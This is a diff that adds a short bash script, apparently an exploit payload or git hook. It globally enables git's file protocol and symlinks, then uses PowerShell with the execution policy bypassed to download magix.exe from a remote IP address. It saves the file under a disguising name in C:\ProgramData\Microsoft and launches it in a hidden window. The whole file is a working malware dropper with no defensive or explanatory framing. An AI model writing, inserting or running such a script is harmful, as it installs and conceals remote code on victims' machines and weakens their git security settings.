@@ -1,0 +1,13 @@
+#!/bin/bash
+
+git config --global protocol.file.allow always
+git config --global core.symlinks true
+git config --global init.defaultBranch main
+
+sleep 5s 
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://172.26.48.122:8080/magix.exe -OutFile 'C:\ProgramData\Microsoft\win.exe'"
+
+ 
+sleep 15s
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process 'C:\ProgramData\Microsoft\win.exe' -WindowStyle Hidden" 
+ 
